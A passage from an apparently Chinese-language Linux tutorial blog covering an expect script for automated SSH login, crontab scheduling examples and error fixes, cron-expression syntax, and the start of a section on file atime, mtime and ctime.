class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">#!/bin/bash<br>user=<span class="hljs-string">&quot;mrswhite&quot;</span><br>host=<span class="hljs-string">&quot;192.168.37.9&quot;</span><br>password=<span class="hljs-string">&quot;test20221007&quot;</span><br>/usr/bin/<span class="hljs-keyword">expect</span> &lt;&lt; EOF<br><span class="hljs-keyword">set</span> time <span class="hljs-number">20</span><br>spawn ssh $<span class="hljs-symbol">user@</span>$host<br><span class="hljs-keyword">expect</span> &#123;<br><span class="hljs-string">&quot;*yes/no&quot;</span> &#123; send <span class="hljs-string">&quot;yes\r&quot;</span>; exp_continue &#125;<br><span class="hljs-string">&quot;*password:&quot;</span> &#123; send <span class="hljs-string">&quot;<span class="hljs-variable">$password</span>\r&quot;</span> &#125;<br>&#125;<br><span class="hljs-keyword">expect</span> <span class="hljs-string">&quot;*#&quot;</span><br>send <span class="hljs-string">&quot;pwd\r&quot;</span><br><span class="hljs-keyword">expect</span> <span class="hljs-string">&quot;*#&quot;</span><br>send <span class="hljs-string">&quot;df -h\r&quot;</span><br><span class="hljs-keyword">expect</span> <span class="hljs-string">&quot;*#&quot;</span><br>send <span class="hljs-string">&quot;exit\r&quot;</span><br>interact<br><span class="hljs-keyword">expect</span> eof<br>EOF<br></code></pre></td></tr></table></figure><p><img src="640-1690382168731-6.png" alt="图片"></p><p> <strong>五、expect相关错误处理</strong></p><p><strong>1.invalid command name “/usr/bin/expect”</strong></p><p><img src="640-1690382170489-9.png" alt="图片"></p><p>解决方案：此时是使用bash脚本嵌套了expect代码，所以执行采用以下两种方式都可以</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">./expect_dem<span class="hljs-meta">o3</span>.shsh expect_dem<span class="hljs-meta">o3</span>.sh<br><br></code></pre></td></tr></table></figure><p><img src="640-1690382172977-12.png" alt="图片"></p><p><strong>2.invalid command name “:” 转义问题</strong></p><p><img src="640-1690382178337-15.png" alt="图片"></p><p> 解决方案：send里面的内容中的括号[]有问题，不能使用[],将其去除或者添加转义字符</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">send</span> <span class="hljs-string">&quot;cat 20221007.txt | awk -F : &#x27;&#123;print $2&#125;&#x27;&quot;</span><br><span class="hljs-keyword">send</span> <span class="hljs-string">&quot;cat 20221007.txt | awk -F \[:\] &#x27;&#123;print $2&#125;&#x27;\r&quot;</span><br><br></code></pre></td></tr></table></figure><p><img src="640-1690382181337-18.png" alt="图片"></p><p><strong>2.cron</strong><br>作用：可以根据配置文件约定的时间来执行特定的任务<br>参考下面：<br>Linux Crontab 定时任务：</p><p><strong>一.cron介绍</strong><br>linux内置的cron进程能帮我们实现这些需求，cron搭配shell脚本，非常复杂的指令也没有问题。<br><strong>1. var/spool/cron/</strong></p><p>目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名<br><strong>2. _/etc/crontab</strong></p><p>这个文件负责调度各种管理和维护任务。<br><strong>3. /etc/cron.d/</strong></p><p>这个目录用来存放任何要执行的crontab文件或脚本。<br>我们还可以把脚本放在/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p><p><strong>二.crontab的使用</strong><br>我们常用的命令如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">crontab <span class="hljs-selector-attr">[-u username]</span>　　　　<span class="hljs-comment">//省略用户表表示操作当前用户的crontab</span><br><span class="hljs-number">1</span>. -e      (编辑工作表)<br><span class="hljs-number">2</span>. -l      (列出工作表里的命令)<br><span class="hljs-number">3</span>. -r      (删除工作作)<br></code></pre></td></tr></table></figure><p>我们用crontab -e进入当前用户的工作表编辑，是常见的vim界面。每行是一条命令。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">crontab的命令构成为 时间+动作，其时间有分、时、日、月、周五种，操作符有<br><span class="hljs-bullet">* </span>取值范围内的所有数字<br>/ 每过多少个数字<br><span class="hljs-bullet">- </span>从X到Z<br>，散列数字<br></code></pre></td></tr></table></figure><p><strong>三.常见定时任务设置</strong><br>实例1：每1分钟执行一次myCommand</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">*</span> <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">* *</span> myCommand<br></code></pre></td></tr></table></figure><p>实例2：每小时的第3和第15分钟执行</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">3,15 <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">* *</span> myCommand<br></code></pre></td></tr></table></figure><p>实例3：在上午8点到11点的第3和第15分钟执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>,<span class="hljs-number">15</span> <span class="hljs-number">8</span>-<span class="hljs-number">11</span> * * * myCommand<br></code></pre></td></tr></table></figure><p>实例4：每隔两天的上午8点到11点的第3和第15分钟执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>,<span class="hljs-number">15</span> <span class="hljs-number">8</span>-<span class="hljs-number">11</span> */<span class="hljs-number">2</span> * * myCommand<br></code></pre></td></tr></table></figure><p>实例5：每周一上午8点到11点的第3和第15分钟执行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>,<span class="hljs-number">15</span> <span class="hljs-number">8</span>-<span class="hljs-number">11</span> * * <span class="hljs-number">1</span> myCommand<br></code></pre></td></tr></table></figure><p>实例6：每晚的21:30重启smb</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">30 </span><span class="hljs-number">21</span> * * * /etc/init.d/smb restart<br></code></pre></td></tr></table></figure><p>实例7：每月1、10、22日的4 : 45重启smb</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">45 </span><span class="hljs-number">4</span> <span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">22</span> * * /etc/init.d/smb restart<br></code></pre></td></tr></table></figure><p>实例8：每周六、周日的1 : 10重启smb</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">10 </span><span class="hljs-number">1</span> * * <span class="hljs-number">6</span>,<span class="hljs-number">0</span> /etc/init.d/smb restart<br></code></pre></td></tr></table></figure><p>实例9：每天18 : 00至23 : 00之间每隔30分钟重启smb</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>,<span class="hljs-number">30</span> <span class="hljs-number">18</span>-<span class="hljs-number">23</span> * * * /etc/init.d/smb restart<br></code></pre></td></tr></table></figure><p>实例10：每星期六的晚上11 : 00 pm重启smb</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">23</span> * * <span class="hljs-number">6</span> /etc/init.d/smb restart<br></code></pre></td></tr></table></figure><p>实例11：每一小时重启smb</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>*/<span class="hljs-number">1</span> * * * /etc/init.d/smb restart<br></code></pre></td></tr></table></figure><p>实例12：晚上11点到早上7点之间，每隔一小时重启smb</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">23</span>-<span class="hljs-number">7</span>/<span class="hljs-number">1</span> * * * /etc/init.d/smb restart<br></code></pre></td></tr></table></figure><p><strong>四.实例操作</strong></p><p><strong>1.文件实时写入:</strong></p><p><strong>1) 查看定时任务状态</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@localhost ~]<span class="hljs-comment">#service crond status</span><br>Redirecting to <span class="hljs-regexp">/bin/</span>systemctl status crond.service<br>● crond.service - Command Scheduler  <br>      Loaded: loaded (<span class="hljs-regexp">/usr/</span>lib<span class="hljs-regexp">/systemd/</span>system/crond.service; enabled; vendor preset: enabled)  <br>       Active: active (running) since Mon <span class="hljs-number">2021</span>-<span class="hljs-number">09</span>-<span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">22</span>:<span class="hljs-number">18</span> CST; <span class="hljs-number">24</span>s ago Main PID: <span class="hljs-number">17516</span> (crond)  <br>       CGroup: <span class="hljs-regexp">/system.slice/</span>crond.service           <br>            └─<span class="hljs-number">17516</span> <span class="hljs-regexp">/usr/</span>sbin/crond -n<br></code></pre></td></tr></table></figure><p><strong>2) 关闭/开启定时任务</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># service crond stop</span><br>Redirecting <span class="hljs-keyword">to</span> /bin/systemctl stop crond.service<br>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># service crond start</span><br>Redirecting <span class="hljs-keyword">to</span> /bin/systemctl start crond.service<br><br></code></pre></td></tr></table></figure><p><strong>3) 编辑定时任务</strong></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-punctuation">[</span>root<span class="hljs-operator">@</span>localhost <span class="hljs-operator">~</span><span class="hljs-punctuation">]</span><span class="hljs-comment"># crontab -e</span><br><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> echo `date &#x27;+\%Y-\%m-\%d \%H:\%M:\%S&#x27;` <span class="hljs-operator">&gt;</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">123.</span>txt <span class="hljs-comment">#每分钟执行一次</span><br><br></code></pre></td></tr></table></figure><p><strong>4) 查看已存在的定时任务</strong></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-punctuation">[</span>root<span class="hljs-operator">@</span>localhost <span class="hljs-operator">~</span><span class="hljs-punctuation">]</span><span class="hljs-comment"># crontab -l</span><br><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> echo `date &#x27;+\%Y-\%m-\%d \%H:\%M:\%S&#x27;` <span class="hljs-operator">&gt;</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">123.</span>txt<br><br></code></pre></td></tr></table></figure><p><strong>5) 验证校验生成</strong></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@localhost ~]# cat 123.txt <br>2021<span class="hljs-string">-09</span><span class="hljs-string">-20</span> 01:13:01<br>2021<span class="hljs-string">-09</span><span class="hljs-string">-20</span> 01:14:01<br>2021<span class="hljs-string">-09</span><span class="hljs-string">-20</span> 01:15:01<br><br></code></pre></td></tr></table></figure><p><strong>2. 定期清理对应目录下的文件</strong></p><p>*<em>1) 预制数据:</em></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">[root@localhost test<span class="hljs-number">20210920</span>]<span class="hljs-attr"># echo abcdefg | tee -a file&#123;1</span>.<span class="hljs-number">.5</span>&#125;.logabcdefg[root@localhost test<span class="hljs-number">20210920</span>]<span class="hljs-attr"># du -sh *4</span><span class="hljs-number">.0</span>K    file<span class="hljs-number">1.</span>lo<span class="hljs-name">g4.0</span>K    file<span class="hljs-number">2.</span>lo<span class="hljs-name">g4.0</span>K    file<span class="hljs-number">3.</span>lo<span class="hljs-name">g4.0</span>K    file<span class="hljs-number">4.</span>lo<span class="hljs-name">g4.0</span>K    file<span class="hljs-number">5.</span>log<br></code></pre></td></tr></table></figure><p><strong>2) 添加定时任务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@localhost ~]<span class="hljs-comment"># crontab -e</span><br>* * * * * find  /root/test20210920  -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&#x27;*.log&#x27;</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cp</span> /dev/null &#123;&#125; \;<br><br></code></pre></td></tr></table></figure><p><strong>3) 检查定时任务执行,1分钟左右</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> test20210920]<span class="hljs-meta"># du -sh *</span><br><span class="hljs-number">0</span>    file1.<span class="hljs-built_in">log</span><br><span class="hljs-number">0</span>    file2.<span class="hljs-built_in">log</span><br><span class="hljs-number">0</span>    file3.<span class="hljs-built_in">log</span><br><span class="hljs-number">0</span>    file4.<span class="hljs-built_in">log</span><br><span class="hljs-number">0</span>    file5.<span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><strong>4) 查看定时任务执行情况:</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[root@localhost test20210920]# tail -<span class="hljs-number">5</span> <span class="hljs-regexp">/var/</span>log/cron<br>Sep <span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">56</span>:<span class="hljs-number">33</span> localhost crontab[<span class="hljs-number">17797</span>]: (root) END EDIT (root)<br>Sep <span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">56</span>:<span class="hljs-number">51</span> localhost crontab[<span class="hljs-number">17802</span>]: (root) BEGIN EDIT (root)<br>Sep <span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">56</span>:<span class="hljs-number">54</span> localhost crontab[<span class="hljs-number">17802</span>]: (root) END EDIT (root)<br>Sep <span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">57</span>:<span class="hljs-number">01</span> localhost CROND[<span class="hljs-number">17809</span>]: (root) CMD (<span class="hljs-keyword">find</span>  <span class="hljs-regexp">/root/</span>test20210920  -type f -name <span class="hljs-string">&#x27;*.log&#x27;</span> -exec cp <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> &#123;&#125; \;)<br>Sep <span class="hljs-number">20</span> <span class="hljs-number">01</span>:<span class="hljs-number">58</span>:<span class="hljs-number">01</span> localhost CROND[<span class="hljs-number">17819</span>]: (root) CMD (<span class="hljs-keyword">find</span>  <span class="hljs-regexp">/root/</span>test20210920  -type f -name <span class="hljs-string">&#x27;*.log&#x27;</span> -exec cp <span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span> &#123;&#125; \;)<br></code></pre></td></tr></table></figure><p><strong>五.常见错误</strong></p><p><strong>1.errors in crontab file, can’t install</strong></p><p><img src="640-1690382187314-21.png" alt="图片"></p><p> <strong>解决方式:</strong></p><p>因为你的crontab格式错误，即没有按照规则写</p><p>查看原命令并修正:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">date</span> +&quot;<span class="hljs-variable">%Y-%</span>m-%d <span class="hljs-variable">%H:%</span>M&quot;` &gt;&gt; <span class="hljs-number">123</span>.txt<br><br></code></pre></td></tr></table></figure><p>修改后正常保存:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">*</span> <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">* *</span> echo <span class="hljs-code">`date +&quot;%Y-%m-%d %H:%M&quot;`</span> &gt;&gt; 123.txt<br><br></code></pre></td></tr></table></figure><p> <strong>2.接以上错误:</strong></p><p>邮件内报错:cat /var/spool/mail/root</p><p><img src="640-1690382207528-24.png" alt="图片"></p><p><strong>解决方式:</strong> </p><p>crontab内%需要转义,修复定时任务正常</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r"><span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> <span class="hljs-operator">*</span> echo `date &#x27;+\%Y-\%m-\%d \%H:\%M:\%S&#x27;` <span class="hljs-operator">&gt;</span><span class="hljs-operator">&gt;</span> <span class="hljs-number">123.</span>txt<br></code></pre></td></tr></table></figure><p>cron表达式：</p><p><strong>一.cron</strong></p><p>计划任务，是任务在约定的时间执行已经计划好的工作，这是表面的意思。在Linux中，我们经常用到 cron 服务器来完成这项工作。cron服务器可以根据配置文件约定的时间来执行特定的任务</p><p> <strong>二.cron表达式</strong></p><p>Cron表达式是一个字符串，字符串以5或6个空格隔开，分为6或7个域，每一个域代表一个含义，Cron有如下两种语法格式：</p><p>Seconds Minutes Hours DayofMonth Month DayofWeek Year或</p><p>Seconds Minutes Hours DayofMonth Month DayofWeek</p><p> <strong>三.每个域的取值范围</strong></p><table><thead><tr><th><strong>域名</strong></th><th><strong>可取值</strong></th><th><strong>可取符号（仅列部分常用）</strong></th></tr></thead><tbody><tr><td>秒域</td><td>0~59的整数</td><td>*  -  ,  /</td></tr><tr><td>分域</td><td>0~59的整数</td><td>*  -  ,  /</td></tr><tr><td>时域</td><td>0~23的整数</td><td>*  -  ,  /</td></tr><tr><td>日域</td><td>1~31的整数</td><td>*  -  ,  /  ?  L</td></tr><tr><td>月域</td><td>1<del>12的整数或JAN</del>DEC</td><td>*  -  ,  /</td></tr><tr><td>周域</td><td>1<del>7的整数或SUN</del>SAT</td><td>*  -  ,  /  ?  L  #</td></tr><tr><td>年域</td><td>1970~2099的整数</td><td>*  -  ,  /</td></tr></tbody></table><p> <strong>四.符号的意义</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> <span class="hljs-emphasis">* 表示可以匹配该域的所有值；</span><br><span class="hljs-emphasis">例如，&quot;0 0 13 *</span> <span class="hljs-emphasis">* ?&quot;表示每天的13点执行一次。</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">2. ? 在cron表达式中必须出现且只能出现1次，用在日域或周域上，表示不确定值、不限制值；</span><br><span class="hljs-emphasis">它与*</span>的区别是，并不能匹配到该域上的所有值，例如指定了3月份每个周五，那么3月份的周五可能只有4个值；<br>例如，&quot;0 0 5 6 <span class="hljs-emphasis">* ?&quot;表示每个月6日5点钟执行而无论周几，&quot;0 0 5 ? *</span> 3&quot;表示每个周三5点钟执行而无论是几号。<br><br><span class="hljs-bullet">3.</span> - 表示匹配该域上的一个范围；<br>例如，&quot;0 30 9-15 ? <span class="hljs-emphasis">* *</span>&quot;表示每天的9:30-15:30每小时执行一次，&quot;0 1-5 <span class="hljs-emphasis">* ? *</span> 1&quot;表示每周日每个小时的1-5分钟每分钟执行一次。<br><span class="hljs-bullet">4.</span> , 表示枚举值；<br>例如，&quot;0 0 8,16,23 ? <span class="hljs-emphasis">* 1,7&quot;表示每个周六日的8点、16点、23点各执行一次。</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">5. / 表示起始时间和间隔时间；</span><br><span class="hljs-emphasis">例如，&quot;0 0 3/5 *</span> <span class="hljs-emphasis">* ?&quot;表示每天3点开始执行，每隔5个小时执行一次，即3点、8点、13点、18点、23点各执行一次，</span><br><span class="hljs-emphasis">&quot;*</span>/5 <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">* *</span> ?&quot;表示每隔5秒钟执行一次，&quot;0 <span class="hljs-emphasis">*/1 *</span> <span class="hljs-emphasis">* *</span> ?&quot;表示每隔1分钟执行一次。<br><br><span class="hljs-bullet">6.</span> # 只能用于周域上，#后面的数字表示第几周，如果不存在这个周的值，则不执行；<br>例如，&quot;0 0 0 ? <span class="hljs-emphasis">* 5#2&quot;表示每个月第2个周四零点执行，&quot;15 30 6 ? *</span> 7#5&quot;表示每个月第5个周六6:30:15执行，如果某个月不存在第5个周六，则不执行。<br><br><span class="hljs-bullet">7.</span> L 只能用于日域或周域，用于日域时表示当月最后一天，用于周域如果前面不加数字表示周六，加数字表示最后一个周值；<br>例如，&quot;0 0 23 L <span class="hljs-emphasis">* ?&quot;表示每月最后一天的23点执行，&quot;0 0 23 ? *</span> L&quot;表示每周六的23点执行，&quot;0 0 23 ? <span class="hljs-emphasis">* 3L&quot;表示每月最后一个周二的23点执行。</span><br></code></pre></td></tr></table></figure><p><strong>五.常用表达式例子</strong></p><table><thead><tr><th><strong>意义</strong></th><th><strong>表达式</strong></th></tr></thead><tbody><tr><td>每隔5秒钟执行一次</td><td>*/5 * * * * ?</td></tr><tr><td>每隔1分钟执行一次</td><td>0 */1 * * * ?</td></tr><tr><td>每天1点执行一次</td><td>0 0 1 * * ?</td></tr><tr><td>每天23点55分执行一次</td><td>0 55 23 * * ？</td></tr><tr><td>每月最后一天23点执行一次</td><td>0 0 23 L * ？</td></tr><tr><td>每周六8点执行一次</td><td>0 0 8 ? * L</td></tr><tr><td>每月最后一个周五，每隔2小时执行一次</td><td>0 0 */2 ? * 6L</td></tr><tr><td>每月的第三个星期五上午10:15执行一次</td><td>0 15 10 ? * 5#3</td></tr><tr><td>在每天下午2点到下午2:05期间的每1分钟执行</td><td>0 0-5 14 * * ?</td></tr><tr><td>表示周一到周五每天上午10:15执行</td><td>0 15 10 ? * 2-6</td></tr><tr><td>每个月的最后一个星期五上午10:15执行</td><td>0 15 10 ? * 6L</td></tr><tr><td>每天上午10点，下午2点，4点执行一次</td><td>0 0 10,14,16 * * ?</td></tr><tr><td>朝九晚五工作时间内每半小时执行一次</td><td>0 0/30 9-17 * * ?</td></tr><tr><td>每个星期三中午12点执行一次</td><td>0 0 12 ? * 4</td></tr><tr><td>每年三月的星期三的下午2:10和2:44各执行一次</td><td>0 10,44 14 ? 3 4</td></tr><tr><td>每月的第三个星期五上午10:15执行一次</td><td>0 15 10 ? * 6#3</td></tr><tr><td>每月一日凌晨2点30执行一次</td><td>0 30 2 1 * ?</td></tr><tr><td>每分钟的第10秒与第20秒都会执行</td><td>10,20 * * * * ?</td></tr><tr><td>每月的第2个星期的周5，凌晨执行</td><td>0 0 0 ? * 6#2</td></tr></tbody></table><p> <strong>六.注意事项:</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. 有些子表达式能包含一些范围或列表例如：子表达式（天（星期））可以为 <span class="hljs-string">&quot;MON-FRI&quot;</span>，<span class="hljs-string">&quot;MON，WED，FRI&quot;</span>，<span class="hljs-string">&quot;MON-WED,SAT&quot;</span><br><span class="hljs-attribute">2</span>. <span class="hljs-string">&quot;*&quot;</span>字符代表所有可能的值因此，<span class="hljs-string">&quot;*&quot;</span>在子表达式（月）里表示每个月的含义，<span class="hljs-string">&quot;*&quot;</span>在子表达式（天（星期））表示星期的每一天<br><span class="hljs-attribute">3</span>. <span class="hljs-string">&quot;/&quot;</span>字符用来指定数值的增量 例如：在子表达式（分钟）里的<span class="hljs-string">&quot;0/15&quot;</span>表示从第<span class="hljs-number">0</span>分钟开始，每<span class="hljs-number">15</span>分钟 在子表达式（分钟）里的<span class="hljs-string">&quot;3/20&quot;</span>表示从第<span class="hljs-number">3</span>分钟开始，每<span class="hljs-number">20</span>分钟（它和<span class="hljs-string">&quot;3，23，43&quot;</span>）的含义一样<br><span class="hljs-attribute">4</span>. <span class="hljs-string">&quot;?&quot;</span>字符仅被用于天（月）和天（星期）两个子表达式，表示不指定值 当<span class="hljs-number">2</span>个子表达式其中之一被指定了值以后，为了避免冲突，需要将另一个子表达式的值设为<span class="hljs-string">&quot;?&quot;</span><br><span class="hljs-attribute">5</span>. <span class="hljs-string">&quot;L&quot;</span> 字符仅被用于天（月）和天（星期）两个子表达式，它是单词<span class="hljs-string">&quot;last&quot;</span>的缩写 但是它在两个子表达式里的含义是不同的。 在天（月）子表达式中，<span class="hljs-string">&quot;L&quot;</span>表示一个月的最后一天 在天（星期）自表达式中，<span class="hljs-string">&quot;L&quot;</span>表示一个星期的最后一天，也就是SAT如果在<span class="hljs-string">&quot;L&quot;</span>前有具体的内容，它就具有其他的含义了例如：<span class="hljs-string">&quot;6L&quot;</span>表示这个月的倒数第６天，<span class="hljs-string">&quot;FRIL&quot;</span>表示这个月的最一个星期五 注意：在使用<span class="hljs-string">&quot;L&quot;</span>参数时，不要指定列表或范围，因为这会导致问题<br></code></pre></td></tr></table></figure><p><strong>3.liunx的三个时间atime,mtime,ctime</strong><br>作用:定期删除备份时一般备份文件的mtime来进行删除<br>参考下面：</p><p><strong>一、文件与文件夹三个时间：atime,mtime,ctime的含义</strong><br><strong>1.含义</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">atime（<span class="hljs-keyword">Access</span> <span class="hljs-type">Time</span>）：文件最近被访问时间<br>mtime（Modify <span class="hljs-type">Time</span>）：文件最近内容修改时间<br>ctime（Change <span class="hljs-type">Time</span>）：文件最近权限和属性修改时间<br></code></pre></td></tr></table></figure><p><strong>2.文件的触发time修改的情况</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">atime（<span class="hljs-keyword">Access</span> <span class="hljs-type">Time</span>）：在读取文件或者执行文件时更改的任何对inode的访问都会使此处改变<br>mtime（Modify <span class="hljs-type">Time</span>）：在写入文件时随文件内容的更改而更改的<br>ctime（Change <span class="hljs-type">Time</span>）：在写入文件、更改所有者、权限或链接设置（更改状态）时随 Inode 的内容更改而更改的<br></code></pre></td></tr></table></figure><p><strong>3.文件夹触发time修改的情况</strong></p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">atime（Access <span class="hljs-keyword">Time</span>）：读取文件或者执行文件时更改的（cd不会ls会改变）<br>mtime（Modify <span class="hljs-keyword">Time</span>）：在文件夹中有文件的新建才会改变，注意使用vi在文件夹内新建文件即使退出时也会变mtime，而只更改文件夹内文件内容不会修改文件夹的mtime<br>ctime（Change <span class="hljs-keyword">Time</span>）：ctime 基本同文件的ctime，其体现的是inode的<span class="hljs-built_in">change</span> <span class="hljs-built_in">time</span><br></code></pre></td></tr></table></figure><p><strong>4.注意事项，mtime与ctime</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mtime的改变必然导致ctime的改变，但是ctime不一定导致mtime的更改<br></code></pre></td></tr></table></figure><p><strong>二、stat命令查看文件的时间</strong></p><figure class="highlight 